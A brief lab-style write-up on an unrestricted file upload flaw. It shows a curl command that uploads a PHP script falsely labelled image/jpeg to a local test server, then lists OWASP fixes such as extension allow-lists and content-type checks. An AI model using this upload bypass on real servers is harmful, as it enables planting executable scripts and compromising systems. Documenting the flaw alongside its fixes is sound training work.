## Unrestricted File Upload

Here we see that there is no protection against the upload of a script if this one is cast as a jpeg, so we force the upload of a script by using type as image/jpeg :
```bash
curl.exe -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://192.168.56.101/index.php?page=upload > test.txt
```

## Patch 
[many solution presented by OWASP org](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload#Prevention_Methods_.28Solutions_to_be_more_secure.29)

most of it is list of authorize extension, 
“Content-Type” Header Validation
Using a File Type Detector
